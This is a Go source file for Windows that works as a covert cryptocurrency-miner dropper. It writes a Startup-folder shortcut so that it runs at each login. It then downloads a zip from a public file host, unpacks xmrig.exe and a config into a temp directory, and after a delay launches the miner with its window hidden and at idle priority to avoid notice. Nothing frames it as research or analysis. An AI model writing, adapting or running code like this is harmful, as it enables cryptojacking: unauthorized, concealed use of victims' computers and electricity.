package main

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"golang.org/x/sys/windows"
	"os/user"
// 	"os/signal"
)

const (
	PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
	PROCESS_MODE_BACKGROUND_END   = 0x00200000
)

func downloadFile(filepath string, url string) (err error) {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil	{
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil	{
		return err
	}

	return nil
}

func unzipSource(source, destination string) error {
	// 1. Open the zip file
	reader, err := zip.OpenReader(source)
	if err != nil {
		return err
	}
	defer reader.Close()

	// 2. Get the absolute destination path
	destination, err = filepath.Abs(destination)
	if err != nil {
		return err
	}

	// 3. Iterate over zip files inside the archive and unzip each of them
	for _, f := range reader.File {
		err := unzipFile(f, destination)
		if err != nil {
			return err
		}
	}

	return nil
}

func unzipFile(f *zip.File, destination string) error {
	// 4. Check if file paths are not vulnerable to Zip Slip
	filePath := filepath.Join(destination, f.Name)
	if !strings.HasPrefix(filePath, filepath.Clean(destination)+string(os.PathSeparator)) {
		return fmt.Errorf("invalid file path: %s", filePath)
	}

	// 5. Create directory tree
	if f.FileInfo().IsDir() {
		if err := os.MkdirAll(filePath, os.ModePerm); err != nil {
			return err
		}
		return nil
	}

	if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
		return err
	}

	// 6. Create a destination file for unzipped content
	destinationFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	// 7. Unzip the content of a file and copy it to the destination file
	zippedFile, err := f.Open()
	if err != nil {
		return err
	}
	defer zippedFile.Close()

	if _, err := io.Copy(destinationFile, zippedFile); err != nil {
		return err
	}
	return nil
}

func startCommand(dir string) {
	time.Sleep(60*time.Second)

	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
	}

	handle, err := syscall.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(cmd.Process.Pid))
	if err != nil {
		log.Println("Error getting process handle:", err)
	}

//	err := syscall.Setpriority(syscall.PRIO_PROCESS, cmd.Process.Pid, 10)
//	if err != nil {
//		log.Println("Error setting process priority:", err)
//	}

	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		log.Println("Error setting process priority:", err)
	}

	// And when you need to wait for the command to finish:
	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}

func RemoveContents(dir string) error {
	d, err := os.Open(dir)
	if err != nil {
		return err
	}
	defer d.Close()
	names, err := d.Readdirnames(-1)
	if err != nil {
		return err
	}
	for _, name := range names {
		err = os.RemoveAll(filepath.Join(dir, name))
		if err != nil {
			return err
		}
	}
	return nil
}

func copy(src, dst string) error {
	if _, err := os.Stat(dst); os.IsNotExist(err) {
		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.Create(dst)
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		if err != nil {
			return err
		}
	}
	return nil
}

func createShortcut(shortcutPath string, targetPath string) error {
	shortcut, err := os.Create(shortcutPath)
	if err != nil {
		return err
	}
	defer shortcut.Close()

	shortcut.WriteString("[InternetShortcut]\n")
	shortcut.WriteString("URL=file:///" + targetPath + "\n")
	shortcut.WriteString("IconIndex=0\n")
	shortcut.WriteString("IconFile=" + targetPath + "\n")
	shortcut.Sync()

	return nil
}

func autostart() {
	u, err := user.Current()
	if err != nil {
		log.Printf("Error getting current user: %s\n", err)
	}
	startupFolder := filepath.Join(u.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	shortcutPath := filepath.Join(startupFolder, "xmrminer.lnk")
	targetPath, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %s\n", err)
	}

	err = createShortcut(shortcutPath, targetPath)
	if err != nil {
		log.Printf("Error creating shortcut: %s\n", err)
	}
}

func main() {
	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening file: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)

//	currentUser, err := user.Current()
//	if err != nil {
//		log.Fatalf(err.Error())
//	}
//	homedir := currentUser.HomeDir

//	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
//	err = copy(os.Args[0], startup)
//	if err != nil {
//		log.Panicf("copy -> %v", err)
//	}
//	log.Printf("NOTERROR startup string is: %s", startup)

	autostart()

	dir, err := ioutil.TempDir("", "xmrminer")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

//	sigs := make(chan os.Signal, 1)
//	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
//	go func() {
//  		<- sigs
//  		err := RemoveContents(filepath.Join("tmp", "xmrcache"))
//  		if err != nil {
//  			log.Fatal(err)
//  		}
//  		os.Exit(0)
//	}()

	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/52ea29.zip")
	if err != nil {
		log.Fatalf("error downloading file: %v", err)
	}

	err = unzipSource(filepath.Join(dir, "xmrcache.zip"), filepath.Join(dir, "xmrcache"))
	if err != nil {
		log.Fatal(err)
	}

	startCommand(dir)
}
